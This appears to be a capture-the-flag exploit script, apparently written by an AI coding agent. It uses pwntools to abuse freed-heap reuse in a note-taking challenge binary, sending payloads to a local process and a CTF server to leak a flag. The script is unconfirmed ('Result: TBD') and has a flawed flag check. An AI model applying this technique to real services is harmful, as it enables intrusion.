#!/usr/bin/env python3
"""
Author: Claude Code
Purpose: Exploit based on Ghidra analysis insights
Created: 2025-11-16 00:30
Updated: 2025-11-16 00:30
Key insights from Ghidra:
    1. The read loop reads up to size+1 chars, then nulls at position size
    2. Each "set filename" call leaks the old filepath allocation
    3. We can create heap holes and potentially overlap allocations
Strategy:
    - Create a note containing "flag.txt"
    - Use heap manipulation to make filepath point to our controlled data
Expected: Get the flag
Result: TBD
"""

from pwn import *

context.log_level = 'info'

def test_local():
    """Test locally first"""
    import os
    binary_path = os.path.join(os.path.dirname(__file__), 'exp300-2-default')
    p = process(binary_path)
    p.recvuntil(b'Salutation')

    # Strategy: Create note with "flag.txt", then manipulate heap
    # so that when we set filename, it uses the same memory

    # Create note 0 with "flag.txt" - size 8
    p.sendlineafter(b'Pick one: ', b'1')
    p.sendlineafter(b'Size (bytes): ', b'8')
    p.sendlineafter(b'Write: ', b'flag.txt')

    # Delete note 0 - frees the memory
    p.sendlineafter(b'Pick one: ', b'2')
    p.sendlineafter(b'Note ID to delete: ', b'0')

    # Set filename - might reuse the freed chunk that had "flag.txt"
    p.sendlineafter(b'Pick one: ', b'3')

    # Cat the file
    p.sendlineafter(b'Pick one: ', b'4')
    result = p.recvall(timeout=2)

    print(f"[*] Local test result: {result}")
    p.close()

    return b'poctf{' in result

def test_remote():
    """Test against remote server"""
    try:
        p = remote('exp300-2.pointeroverflowctf.com', 7092, timeout=15)
        p.recvuntil(b'choice:', timeout=3)

        # Same strategy on remote
        p.sendline(b'1')
        p.recv(timeout=1)
        p.sendline(b'8')
        p.recv(timeout=1)
        p.sendline(b'flag.txt')
        p.recv(timeout=1)

        p.sendline(b'2')
        p.recv(timeout=1)
        p.sendline(b'0')
        p.recv(timeout=1)

        p.sendline(b'3')
        p.recv(timeout=1)

        p.sendline(b'4')
        result = p.recvall(timeout=2)

        print(f"[*] Remote result: {result}")

        if b'poctf{' in result.lower() or b'POCTF{' in result.lower():
            print(f"\n[+][+][+] SUCCESS! FLAG: {result}")
            return True

        p.close()
    except Exception as e:
        print(f"[-] Error: {e}")

    return False

print("[*] Testing remote...")
test_remote()
